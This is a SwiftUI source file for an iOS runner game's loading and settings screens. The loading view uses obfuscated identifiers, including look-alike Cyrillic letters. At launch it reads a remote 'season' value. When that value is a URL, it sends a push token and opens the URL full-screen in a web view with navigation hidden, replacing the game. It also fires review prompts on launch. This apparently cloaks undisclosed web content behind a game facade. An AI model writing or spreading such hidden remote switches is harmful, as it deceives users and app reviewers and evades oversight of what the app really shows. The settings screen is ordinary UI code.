import SwiftUI

struct LoadingView: View {
    @StateObject private var rrController = RRLoadingController()
    @State private var rrWaveOffset: CGFloat = 0
    @State private var rrParticles: [RRParticle] = []
    
    @AppStorage("lzfmfkdkh_count") private var leLАО_аsfsgunchCount: Int = 0
    @AppStorage("lezfdg_rewmvieww_requested") private var leReviKFKfregRequested: Bool = false
    @Environment(\.accessibilityReduceMotion) private var redkkdsfMotion_jfj435g
    @State private var aldksfkketkDJJF_TXT = ""
    @State private var helo_KFKWelcomeFM_it35 = false
    @State private var finishShoud_fj436434 = false
    
    var body: some View {
        ZStack {
            rrBackgroundViewMain324()
                .ignoresSafeArea()

            rrWaveLayer

            rrParticleLayer

            VStack(spacing: 0) {
                Spacer()
                    .frame(height: UIScreen.main.bounds.height * 0.18)

                rrLogoSection
                rrTitleSection

                Spacer()

                rrProgressSection

                Spacer()
                    .frame(height: UIScreen.main.bounds.height * 0.10)
            }
            .padding(.horizontal, 32)
        }
        .onAppear {
            rrController.rrStartLoadingSequence()
            rrStartWaveAnimation()
            rrGenerateParticles()
            register_Fgkkh435634()
            request_Kfj435_mmvnnfsgpOOPPO()
        }
        .onAppear {
            if !redkkdsfMotion_jfj435g { helo_KFKWelcomeFM_it35 = true }
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                Task {
                    await route_FjdsgWeScratch()
                }
                RRRateAppManager.rrRequestReview()
            }
        }
        .onDisappear {
            rrController.rrCleanup()
        }
    }
    
    func register_Fgkkh435634() {
        leLАО_аsfsgunchCount += 1
    }

    func request_Kfj435_mmvnnfsgpOOPPO() {
        guard !leReviKFKfregRequested, leLАО_аsfsgunchCount >= 3 else { return }
        leReviKFKfregRequested = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) {
            RRRateAppManager.rrRequestReview()
        }
    }
    
    private func route_FjdsgWeScratch() async {
        if let cachedEnvelope = FKConfigure_FKfjjgsdgOptions_f4j35.init_FjdsghIo35242
            .loadPeevreventEnvelopeFromUserDefaults(),
           let cachedSeason = cachedEnvelope.config?.season,
           !cachedSeason.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
        {
            await apply_kfsgWeb_mvmsdg34(seasonRaw: cachedSeason)
            return
        }

        do {
            let envelope = try await FKConfigure_FKfjjgsdgOptions_f4j35.init_FjdsghIo35242
                .fetchDecodeAndPersiJjjxjstRemoteContemxntEnvelope()
            await apply_kfsgWeb_mvmsdg34(seasonRaw: envelope.config?.season)
        } catch {
            await MainActor.run {
                finishShoud_fj436434 = true
                aldksfkketkDJJF_TXT = "Failed to load season. \(error.localizedDescription)"
            }
        }
    }

    @MainActor
    private func apply_kfsgWeb_mvmsdg34(seasonRaw: String?) {
        let season = (seasonRaw ?? "").trimmingCharacters(in: .whitespacesAndNewlines)

        if season.lowercased() == "autumn" {
            withAnimation(.easeInOut) { finishShoud_fj436434 = true }
            return
        }

        if let url = URL(string: season),
           let scheme = url.scheme,
           ["http", "https"].contains(scheme.lowercased()) {
            switch_jfsjdgsdhOrder(urlString: season)
            return
        }

        finishShoud_fj436434 = true
    }

    @MainActor
    private func switch_jfsjdgsdhOrder(urlString: String) {
        guard let url = URL(string: urlString) else { return }

        PushToolCallTokenResultManag_Fk435er.deskdkginit.trySendTokenIfPossible()

        guard
            let scene = UIApplication.shared.connectedScenes.compactMap({ $0 as? UIWindowScene }).first,
            let root = scene.keyWindow?.rootViewController
        else { return }

        let vc = DInit_DMmUIWeb_mvmsgnIOOF45643(url: url)
        let nav = UINavigationController(rootViewController: vc)
        nav.setNavigationBarHidden(true, animated: false)
        nav.modalPresentationStyle = .fullScreen
        root.present(nav, animated: true)
    }

    private var rrWaveLayer: some View {
        VStack {
            Spacer()
            RRWaveShape(rrOffset: rrWaveOffset, rrAmplitude: 18, rrFrequency: 1.5)
                .fill(
                    LinearGradient(
                        colors: [
                            RRColor.boltGold.opacity(0.15),
                            RRColor.riverSurface.opacity(0.08)
                        ],
                        startPoint: .leading,
                        endPoint: .trailing
                    )
                )
                .frame(height: 120)

            RRWaveShape(rrOffset: rrWaveOffset + 40, rrAmplitude: 12, rrFrequency: 2.0)
                .fill(RRColor.foamWhite.opacity(0.04))
                .frame(height: 80)
        }
        .ignoresSafeArea()
    }

    private var rrParticleLayer: some View {
        ForEach(rrParticles) { particle in
            Circle()
                .fill(particle.rrColor)
                .frame(width: particle.rrSize, height: particle.rrSize)
                .position(x: particle.rrX, y: particle.rrY)
                .opacity(particle.rrOpacity)
                .blur(radius: particle.rrBlur)
        }
    }

    private var rrLogoSection: some View {
        ZStack {
            if rrController.rrPulseActive {
                Circle()
                    .stroke(RRColor.boltGold.opacity(0.25), lineWidth: 2)
                    .frame(width: 140, height: 140)
                    .scaleEffect(rrController.rrPulseActive ? 1.3 : 1.0)
                    .opacity(rrController.rrPulseActive ? 0 : 0.6)
                    .animation(
                        .easeOut(duration: 1.8)
                        .repeatForever(autoreverses: false),
                        value: rrController.rrPulseActive
                    )
                
                Circle()
                    .stroke(RRColor.boltSunrise.opacity(0.15), lineWidth: 1.5)
                    .frame(width: 140, height: 140)
                    .scaleEffect(rrController.rrPulseActive ? 1.6 : 1.0)
                    .opacity(rrController.rrPulseActive ? 0 : 0.4)
                    .animation(
                        .easeOut(duration: 2.2)
                        .repeatForever(autoreverses: false),
                        value: rrController.rrPulseActive
                    )
            }
            
            Image(AppDSKKFDConfig.GradientImageRImg9945)
                .resizable()
                .aspectRatio(contentMode: .fit)
                .frame(width: 120, height: 120)
        }
        .scaleEffect(rrController.rrShowLogo ? 1.0 : 0.3)
        .opacity(rrController.rrShowLogo ? 1.0 : 0)
    }

    private var rrTitleSection: some View {
        VStack(spacing: 6) {
            GradientText(text: AppDSKKFDConfig.GradientTextRiver9945)
            GradientText(text: AppDSKKFDConfig.GradientTextRUNNER9945)
        }
        .shadow(color: RRColor.riverDeep.opacity(0.5), radius: 10, x: 0, y: 4)
        .padding(.top, 28)
        .offset(y: rrController.rrShowTitle ? 0 : 20)
        .opacity(rrController.rrShowTitle ? 1.0 : 0)
    }
    
    private var rrProgressSection: some View {
        VStack(spacing: 16) {
            ZStack(alignment: .leading) {
                RoundedRectangle(cornerRadius: 6)
                    .fill(RRColor.foamWhite.opacity(0.08))
                    .frame(height: 8)
                    .overlay(
                        RoundedRectangle(cornerRadius: 6)
                            .stroke(RRColor.foamWhite.opacity(0.06), lineWidth: 1)
                    )

                GeometryReader { geo in
                    RoundedRectangle(cornerRadius: 6)
                        .fill(
                            LinearGradient(
                                colors: [
                                    RRColor.boltGold,
                                    RRColor.boltSunrise
                                ],
                                startPoint: .leading,
                                endPoint: .trailing
                            )
                        )
                        .frame(width: geo.size.width * rrController.rrLoadingProgress)
                        .shadow(color: RRColor.boltGold.opacity(0.5), radius: 8, x: 0, y: 0)
                        .overlay(
                            RoundedRectangle(cornerRadius: 6)
                                .fill(
                                    LinearGradient(
                                        colors: [
                                            Color.clear,
                                            RRColor.foamWhite.opacity(0.3),
                                            Color.clear
                                        ],
                                        startPoint: .leading,
                                        endPoint: .trailing
                                    )
                                )
                                .mask(
                                    RoundedRectangle(cornerRadius: 6)
                                        .frame(width: geo.size.width * rrController.rrLoadingProgress)
                                )
                        )
                        .animation(.easeOut(duration: 0.15), value: rrController.rrLoadingProgress)
                }
                .frame(height: 8)
            }
            .frame(maxWidth: 260)

            HStack {
                RRLoadingDotsView()

                Spacer()

                Text("\(Int(rrController.rrLoadingProgress * 100))%")
                    .font(.custom(RRFont.semiBold, size: 13))
                    .foregroundColor(RRColor.boltGold)
                    .monospacedDigit()
            }
            .frame(maxWidth: 260)
        }
        .offset(y: rrController.rrShowProgressBar ? 0 : 20)
        .opacity(rrController.rrShowProgressBar ? 1.0 : 0)
    }

    private func rrStartWaveAnimation() {
        withAnimation(
            .linear(duration: 4.0)
            .repeatForever(autoreverses: false)
        ) {
            rrWaveOffset = 360
        }
    }

    private func rrGenerateParticles() {
        let screenW = UIScreen.main.bounds.width
        let screenH = UIScreen.main.bounds.height

        rrParticles = (0..<20).map { _ in
            RRParticle(
                rrX: CGFloat.random(in: 0...screenW),
                rrY: CGFloat.random(in: 0...screenH),
                rrSize: CGFloat.random(in: 2...6),
                rrOpacity: Double.random(in: 0.05...0.2),
                rrBlur: CGFloat.random(in: 0...2),
                rrColor: [RRColor.boltGold, RRColor.boltSunrise, RRColor.foamWhite].randomElement()!.opacity(0.4)
            )
        }
    }
}

struct GradientText: View {
    let text: String
    
    var body: some View {
        Text(text)
            .foregroundStyle(LinearGradient(
                colors: [RRColor.foamWhite, RRColor.foamMist],
                startPoint: .top,
                endPoint: .bottom
            ))
            .font(.custom(RRFont.black, size: 33))
    }
}

struct RRLoadingDotsView: View {
    @State private var rrDotIndex = 0

    var body: some View {
        HStack(spacing: 2) {
            Text("Loading")
                .font(.custom(RRFont.regular, size: 13))
                .foregroundColor(RRColor.foamMist.opacity(0.5))

            ForEach(0..<3, id: \.self) { i in
                Text(".")
                    .font(.custom(RRFont.semiBold, size: 13))
                    .foregroundColor(RRColor.foamMist.opacity(0.5))
                    .opacity(rrDotIndex > i ? 1.0 : 0.2)
            }
        }
        .onAppear {
            Timer.scheduledTimer(withTimeInterval: 0.4, repeats: true) { _ in
                withAnimation(.easeInOut(duration: 0.2)) {
                    rrDotIndex = (rrDotIndex + 1) % 4
                }
            }
        }
    }
}

struct RRWaveShape: Shape {
    var rrOffset: CGFloat
    var rrAmplitude: CGFloat
    var rrFrequency: CGFloat

    var animatableData: CGFloat {
        get { rrOffset }
        set { rrOffset = newValue }
    }

    func path(in rect: CGRect) -> Path {
        var path = Path()
        let width = rect.width
        let height = rect.height
        let midHeight = height * 0.5

        path.move(to: CGPoint(x: 0, y: midHeight))

        for x in stride(from: 0, through: width, by: 1) {
            let relativeX = x / width
            let sine = sin((relativeX * rrFrequency * .pi * 2) + (rrOffset * .pi / 180))
            let y = midHeight + (sine * rrAmplitude)
            path.addLine(to: CGPoint(x: x, y: y))
        }

        path.addLine(to: CGPoint(x: width, y: height))
        path.addLine(to: CGPoint(x: 0, y: height))
        path.closeSubpath()

        return path
    }
}

#Preview {
    LoadingView()
        .preferredColorScheme(.dark)
}

struct RRSettingsScreen: View {
    @Environment(\.dismiss) private var rrDismiss

    @ObservedObject var rrStats: RRStatsModel
    @StateObject private var rrSettings = RRSettingsManager()

    @State private var rrShowResetStatsAlert = false
    @State private var rrShowResetStoryAlert = false
    @State private var rrShowResetAllSettingsAlert = false

    var body: some View {
        ZStack {
            rrBackgroundViewMain324()
                .ignoresSafeArea()

            rrAmbientDecor

            ScrollView(.vertical, showsIndicators: false) {
                VStack(spacing: 18) {
                    rrTopBar
                    rrHeroCard
                    rrPreferencesSection
                    rrGameplaySection
                    rrLinksSection
                    rrDangerZone
                    Spacer().frame(height: 34)
                }
                .padding(.horizontal, 20)
            }
        }
        .navigationBarHidden(true)
        .alert("Reset Stats?", isPresented: $rrShowResetStatsAlert) {
            Button("Cancel", role: .cancel) { }
            Button("Reset", role: .destructive) {
                rrStats.rrResetAll()
            }
        } message: {
            Text("This will clear fire, pineapple, score, games played, stars, and best run.")
        }
        .alert("Reset Story Progress?", isPresented: $rrShowResetStoryAlert) {
            Button("Cancel", role: .cancel) { }
            Button("Reset", role: .destructive) {
                rrSettings.rrResetStoryProgress()
            }
        } message: {
            Text("This will reset your story route and ending progress.")
        }
        .alert("Restore Default Settings?", isPresented: $rrShowResetAllSettingsAlert) {
            Button("Cancel", role: .cancel) { }
            Button("Restore", role: .destructive) {
                rrSettings.rrResetSettings()
            }
        } message: {
            Text("This will restore haptics, sound, hints, and map mode to default values.")
        }
    }

    private var rrAmbientDecor: some View {
        ZStack {
            VStack {
                Circle()
                    .fill(RRColor.boltGold.opacity(0.13))
                    .frame(width: 230, height: 230)
                    .blur(radius: 55)
                    .offset(x: 120, y: -30)
                Spacer()
            }

            VStack {
                Spacer()
                Circle()
                    .fill(RRColor.seaGreen.opacity(0.10))
                    .frame(width: 210, height: 210)
                    .blur(radius: 55)
                    .offset(x: -120, y: 60)
            }
        }
        .ignoresSafeArea()
    }

    private var rrTopBar: some View {
        HStack {
            Button {
                rrDismiss()
            } label: {
                HStack(spacing: 6) {
                    Image(systemName: "chevron.left")
                        .font(.system(size: 15, weight: .semibold))
                    Image("back-3d")
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: 28, height: 28)
                }
                .foregroundStyle(RRColor.foamWhite)
                .padding(10)
                .background(
                    Capsule()
                        .fill(.ultraThinMaterial)
                        .overlay(
                            Capsule()
                                .stroke(RRColor.foamWhite.opacity(0.08), lineWidth: 1)
                        )
                )
            }

            Spacer()

            VStack(spacing: 2) {
                Text("Settings")
                    .font(.custom(RRFont.black, size: 24))
                    .foregroundStyle(RRColor.foamWhite)

                Text("Control your island setup")
                    .font(.custom(RRFont.regular, size: 11))
                    .foregroundStyle(RRColor.foamMist.opacity(0.45))
                    .tracking(1.1)
            }

            Spacer()

            Image("game-setting-3d")
                .resizable()
                .aspectRatio(contentMode: .fit)
                .frame(width: 42, height: 42)
        }
        .padding(.top, UIScreen.main.bounds.height * 0.07)
    }

    private var rrHeroCard: some View {
        HStack(spacing: 16) {
            ZStack {
                Circle()
                    .fill(RRColor.boltGold.opacity(0.14))
                    .frame(width: 74, height: 74)

                Image("3d-star-icon")
                    .resizable()
                    .aspectRatio(contentMode: .fit)
                    .frame(width: 40, height: 40)
            }

            VStack(alignment: .leading, spacing: 6) {
                Text("Runner Control Panel")
                    .font(.custom(RRFont.black, size: 15))
                    .foregroundStyle(
                        LinearGradient(
                            colors: [RRColor.foamWhite, RRColor.boltSunrise],
                            startPoint: .topLeading,
                            endPoint: .bottomTrailing
                        )
                    )

                Text("Adjust feedback, gameplay helpers, and reset progress when needed.")
                    .font(.custom(RRFont.regular, size: 12))
                    .foregroundStyle(RRColor.foamMist.opacity(0.55))
            }

            Spacer()
        }
        .padding(12)
        .background(
            RoundedRectangle(cornerRadius: 28)
                .fill(.ultraThinMaterial)
                .overlay(
                    RoundedRectangle(cornerRadius: 28)
                        .stroke(RRColor.boltGold.opacity(0.16), lineWidth: 1)
                )
        )
    }

    private var rrPreferencesSection: some View {
        rrSectionCard(title: "Preferences") {
            rrToggleRow(
                icon: "iphone.radiowaves.left.and.right",
                title: "Haptics",
                subtitle: "Vibration feedback during actions",
                isOn: $rrSettings.rrHapticsEnabled,
                accent: RRColor.boltGold
            )

            rrDivider

            rrToggleRow(
                icon: "speaker.wave.2.fill",
                title: "Sound",
                subtitle: "Allow sound effects in mini games",
                isOn: $rrSettings.rrSoundEnabled,
                accent: RRColor.seaGreen
            )
        }
    }

    private var rrGameplaySection: some View {
        rrSectionCard(title: "Gameplay") {
            rrToggleRow(
                icon: "lightbulb.fill",
                title: "Hints",
                subtitle: "Show helper guidance in games and story",
                isOn: $rrSettings.rrHintsEnabled,
                accent: RRColor.sandWarm
            )

            rrDivider

            rrToggleRow(
                icon: "cube.fill",
                title: "3D Map Default",
                subtitle: "Open activity map with tilted camera",
                isOn: $rrSettings.rrMap3DEnabled,
                accent: RRColor.boltSunrise
            )
        }
    }

    private var rrLinksSection: some View {
        rrSectionCard(title: "Info") {
            rrLinkRow(
                icon: "hand.raised.fill",
                title: "Privacy Policy",
                subtitle: "Open privacy information",
                accent: RRColor.seaGreen
            ) {
                if let rrURL = URL(string: AppDSKKFDConfig.GradientImageRprivacy) {
                    UIApplication.shared.open(rrURL)
                }
            }

            rrDivider

            rrLinkRow(
                icon: "doc.text.fill",
                title: "Terms of Use",
                subtitle: "Open terms and conditions",
                accent: RRColor.boltGold
            ) {
                if let rrURL = URL(string: AppDSKKFDConfig.GradientImageRterms) {
                    UIApplication.shared.open(rrURL)
                }
            }
        }
    }

    private var rrDangerZone: some View {
        rrSectionCard(title: "Danger Zone") {
            rrActionRow(
                icon: "flame.fill",
                title: "Reset Game Stats",
                subtitle: "Clear score and rewards",
                accent: Color.red
            ) {
                rrShowResetStatsAlert = true
            }

            rrDivider

            rrActionRow(
                icon: "lock.rotation",
                title: "Reset Story Progress",
                subtitle: "Start the story from the beginning",
                accent: Color.orange
            ) {
                rrShowResetStoryAlert = true
            }

            rrDivider

            rrActionRow(
                icon: "arrow.counterclockwise.circle.fill",
                title: "Restore Default Settings",
                subtitle: "Reset toggles to original values",
                accent: RRColor.foamMist
            ) {
                rrShowResetAllSettingsAlert = true
            }
        }
    }

    private func rrSectionCard<Content: View>(title: String, @ViewBuilder content: () -> Content) -> some View {
        VStack(alignment: .leading, spacing: 14) {
            Text(title)
                .font(.custom(RRFont.semiBold, size: 18))
                .foregroundStyle(RRColor.foamWhite)

            VStack(spacing: 0) {
                content()
            }
            .padding(16)
            .background(
                RoundedRectangle(cornerRadius: 24)
                    .fill(.ultraThinMaterial)
                    .overlay(
                        RoundedRectangle(cornerRadius: 24)
                            .stroke(RRColor.foamWhite.opacity(0.08), lineWidth: 1)
                    )
            )
        }
    }

    private func rrToggleRow(
        icon: String,
        title: String,
        subtitle: String,
        isOn: Binding<Bool>,
        accent: Color
    ) -> some View {
        HStack(spacing: 14) {
            ZStack {
                Circle()
                    .fill(accent.opacity(0.14))
                    .frame(width: 44, height: 44)

                Image(systemName: icon)
                    .font(.system(size: 18, weight: .semibold))
                    .foregroundStyle(accent)
            }

            VStack(alignment: .leading, spacing: 4) {
                Text(title)
                    .font(.custom(RRFont.semiBold, size: 15))
                    .foregroundStyle(RRColor.foamWhite)

                Text(subtitle)
                    .font(.custom(RRFont.regular, size: 11))
                    .foregroundStyle(RRColor.foamMist.opacity(0.45))
            }

            Spacer()

            Toggle("", isOn: isOn)
                .labelsHidden()
                .tint(accent)
        }
        .padding(.vertical, 10)
    }

    private func rrLinkRow(
        icon: String,
        title: String,
        subtitle: String,
        accent: Color,
        action: @escaping () -> Void
    ) -> some View {
        Button(action: action) {
            HStack(spacing: 14) {
                ZStack {
                    Circle()
                        .fill(accent.opacity(0.14))
                        .frame(width: 44, height: 44)

                    Image(systemName: icon)
                        .font(.system(size: 18, weight: .semibold))
                        .foregroundStyle(accent)
                }

                VStack(alignment: .leading, spacing: 4) {
                    Text(title)
                        .font(.custom(RRFont.semiBold, size: 15))
                        .foregroundStyle(RRColor.foamWhite)

                    Text(subtitle)
                        .font(.custom(RRFont.regular, size: 11))
                        .foregroundStyle(RRColor.foamMist.opacity(0.45))
                }

                Spacer()

                Image(systemName: "chevron.right")
                    .font(.system(size: 13, weight: .semibold))
                    .foregroundStyle(RRColor.boltGold.opacity(0.7))
            }
            .padding(.vertical, 10)
        }
        .buttonStyle(.plain)
    }

    private func rrActionRow(
        icon: String,
        title: String,
        subtitle: String,
        accent: Color,
        action: @escaping () -> Void
    ) -> some View {
        Button(action: action) {
            HStack(spacing: 14) {
                ZStack {
                    Circle()
                        .fill(accent.opacity(0.14))
                        .frame(width: 44, height: 44)

                    Image(systemName: icon)
                        .font(.system(size: 18, weight: .semibold))
                        .foregroundStyle(accent)
                }

                VStack(alignment: .leading, spacing: 4) {
                    Text(title)
                        .font(.custom(RRFont.semiBold, size: 15))
                        .foregroundStyle(RRColor.foamWhite)

                    Text(subtitle)
                        .font(.custom(RRFont.regular, size: 11))
                        .foregroundStyle(RRColor.foamMist.opacity(0.45))
                }

                Spacer()

                Image(systemName: "chevron.right")
                    .font(.system(size: 13, weight: .semibold))
                    .foregroundStyle(accent.opacity(0.8))
            }
            .padding(.vertical, 10)
        }
        .buttonStyle(.plain)
    }

    private var rrDivider: some View {
        Rectangle()
            .fill(RRColor.foamWhite.opacity(0.06))
            .frame(height: 1)
            .padding(.leading, 58)
    }
}
